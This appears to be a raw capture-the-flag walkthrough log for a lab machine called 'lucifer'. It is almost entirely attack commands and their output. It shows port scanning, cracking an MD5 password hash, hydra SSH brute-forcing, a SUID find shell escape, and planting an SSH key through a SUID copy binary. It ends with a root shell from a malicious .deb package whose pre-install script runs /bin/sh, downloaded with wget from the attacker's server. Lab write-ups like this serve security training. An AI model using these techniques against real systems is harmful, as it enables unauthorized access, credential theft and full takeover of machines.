@@ -1,0 +1,185 @@
+hack@kali:~$ nmap -A -p- 192.168.1.148                                                             
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-19 17:41 CEST                                   
+Nmap scan report for 192.168.1.148                                                                 
+Host is up (0.0013s latency).                                                                      
+Not shown: 65533 closed ports                                                                      
+PORT   STATE SERVICE VERSION                                                                       
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                
+| ssh-hostkey:                                                                                     
+|   2048 83:e5:a1:51:b1:f6:98:d3:19:e7:59:10:f7:f4:e8:5e (RSA)                                     
+|   256 b2:a6:79:c3:ad:2f:ba:cc:02:b3:42:0d:a2:a3:9e:60 (ECDSA)                                    
+|_  256 ec:1f:d4:29:9f:a5:ae:ca:93:f4:a8:6b:fd:61:44:45 (ED25519)                                  
+80/tcp open  http    Apache httpd                                                                  
+| http-robots.txt: 3 disallowed entries                                                            
+|_/wp-admin/ /wp-login.php /?include=info                                                          
+|_http-server-header: Apache                                                                       
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                                
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                            
+                                                                                                   
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .     
+Nmap done: 1 IP address (1 host up) scanned in 32.85 seconds   
+
+
+
+john:Password123
+
+
+<?php //
+
+
+Echo "API:";
+echo md5(base64_encode("
+
+This stupid webadmin doesn't give me log access.. 
+but i have his creds {victor:00a00cfc5745c3b59202ab06a67bb2dc} 
+
+"));
+
+?>
+
+"
+1
+
+Check md5: 00a00cfc5745c3b59202ab06a67bb2dc:irminsul
+
+
+victor:irminsul
+
+
+victor@lucifer:~/bin$ ./find . -exec /bin/sh -p \; -quit
+
+$ whoami
+john
+
+
+hack@kali:~/CTF/DevrandomCTF_1$ hydra -P pass.txt -L user.txt ssh://192.168.1.148
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-19 18:46:46
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:8/p:3), ~2 tries per task
+[DATA] attacking ssh://192.168.1.148:22/
+[22][ssh] host: 192.168.1.148   login: lisa   password: dropbox2010
+[22][ssh] host: 192.168.1.148   login: victor   password: irminsul
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-19 18:46:54
+
+
+
+lisa@lucifer:~/bin$ ./copy -R /home/henri/ /home/lisa/copied/
+./copy: cannot create directory '/home/lisa/copied/henri': Permission denied
+lisa@lucifer:~/bin$ 
+lisa@lucifer:~/bin$ 
+lisa@lucifer:~/bin$ 
+lisa@lucifer:~/bin$ ls -la
+total 152
+drwxr-xr-x 2 lisa  lisa   4096 Mar 23 19:23 .
+drwxr-x--- 6 lisa  lisa   4096 Apr 19 11:54 ..
+-rwsrws--T 1 henri lisa 146880 Mar 19 14:44 copy
+lisa@lucifer:~/bin$ cd ..
+lisa@lucifer:~$ chmod 777 copied/
+lisa@lucifer:~$ cd bin/
+lisa@lucifer:~/bin$ ./copy -R /home/henri/ /home/lisa/copied/
+lisa@lucifer:~/bin$ 
+lisa@lucifer:~/bin$ 
+lisa@lucifer:~/bin$ cd ..
+lisa@lucifer:~$ ls
+bin  copied
+lisa@lucifer:~$ ls -la copied/
+total 12
+drwxrwxrwx 3 lisa  lisa 4096 Apr 19 11:57 .
+drwxr-x--- 6 lisa  lisa 4096 Apr 19 11:54 ..
+drwxr-x--- 5 henri lisa 4096 Apr 19 11:57 henri
+lisa@lucifer:~$ cd copied/henri/
+lisa@lucifer:~/copied/henri$ ls -la
+total 36
+drwxr-x--- 5 henri lisa 4096 Apr 19 11:57 .
+drwxrwxrwx 3 lisa  lisa 4096 Apr 19 11:57 ..
+-rw-r--r-- 1 henri lisa  220 Apr 19 11:57 .bash_logout
+-rw-r--r-- 1 henri lisa 3526 Apr 19 11:57 .bashrc
+drwxr-xr-x 2 henri lisa 4096 Apr 19 11:57 dust
+-rw-r--r-- 1 henri lisa   38 Apr 19 11:57 flag.txt
+drwxr-xr-x 3 henri lisa 4096 Apr 19 11:57 .local
+-rw-r--r-- 1 henri lisa  675 Apr 19 11:57 .profile
+drwx------ 2 henri lisa 4096 Apr 19 11:57 .ssh
+lisa@lucifer:~/copied/henri$ cat flag.txt 
+You're doning well. .
+
+keep going.. 
+
+lisa@lucifer:~/copied/henri$ 
+
+
+
+lisa@lucifer:~/bin$ ./copy /home/lisa/authorized_keys /home/henri/.ssh
+lisa@lucifer:~/bin$ 
+
+
+hack@kali:~/.ssh$ cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEBWByoUG23ORmR2165ssnH5nXojkkGadc2SNRUaBh9UM9zBoV1iIwGJT4PkBOtK8gQURXpJUoNTqJRTpsHzRTvlxWna6yVhi1tlsQU1+0Ogvqu6AkazNT2VBMoJrBbPvJ5rqT8p+JE9fyE1QRy08soLTq8WCwyIRCkSbwU1TZcY9APtj1L0TZpfvR8R6/Zrds5zf3c63eNL03iZ5sN0Zvu35tMDC+LU8LOvQgDqTmXpAGLS70DbThgS7UvqnVWZDLmqz29EchKKkINeNk/3sQl7AdrKkduxlNbc39nMBP7Ev8BNTXAikXUb901yrmj9aJe/wP0Rg0cMO68L8Mcb4CEZBSmVDVCCmHMjFuov/NOCyNmvvYy4uQ10wmf2WXyR4nRBX8reP9J3uSUkXIfacAtEmyZRpO/8m71HOPaiwPvgGuuNVr5QWwUqWqb2dqDZqQKQE662oyt/h650r4pfZljrGt95nmJCyhgiEQk7UmrEJhdsEpanLFUyNwaeNLM0= hack@kali
+hack@kali:~/.ssh$ 
+hack@kali:~/.ssh$ 
+hack@kali:~/.ssh$ ssh henri@192.168.1.148 -i id_rsa 
+Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+henri@lucifer:~$ 
+
+henri@lucifer:~$ cd /usr/local/bin/
+henri@lucifer:/usr/local/bin$ ls
+cmd
+henri@lucifer:/usr/local/bin$ ls -la
+total 28
+drwxrwsr-x  2 root staff  4096 Mar 25 06:04 .
+drwxrwsr-x 10 root staff  4096 Mar 18 19:26 ..
+-rwsrws--T  1 root henri 16712 Mar 23 19:06 cmd
+henri@lucifer:/usr/local/bin$ 
+henri@lucifer:/usr/local/bin$ 
+henri@lucifer:/usr/local/bin$ ./cmd 
+trevor@lucifer:/usr/local/bin$ 
+
+
+
+TF=$(mktemp -d)
+echo 'exec /bin/sh' > $TF/x.sh
+fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
+
+
+hack@kali:~$ python -m SimpleHTTPServer 8888
+
+
+trevor@lucifer:/home/trevor$ wget 192.168.1.9:8888/x_1.0_all.deb
+--2020-04-19 12:23:30--  http://192.168.1.9:8888/x_1.0_all.deb
+Connecting to 192.168.1.9:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1106 (1.1K) [application/x-debian-package]
+Saving to: ‘x_1.0_all.deb’
+
+x_1.0_all.deb            100%[=================================>]   1.08K  --.-KB/s    in 0s      
+
+2020-04-19 12:23:30 (121 MB/s) - ‘x_1.0_all.deb’ saved [1106/1106]
+
+trevor@lucifer:/home/trevor$ 
+trevor@lucifer:/home/trevor$ 
+trevor@lucifer:/home/trevor$ sudo dpkg -i x_1.0_all.deb
+Selecting previously unselected package x.
+(Reading database ... 40777 files and directories currently installed.)
+Preparing to unpack x_1.0_all.deb ...
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+flag.txt
+# cat flag.txt
+WELl DONE
+
+echo "THISISTHEFLAGTHISISTHEFLAG\!\!\!\@\@\@###" | base64 > thisistheflag.txt
+
+
+
+
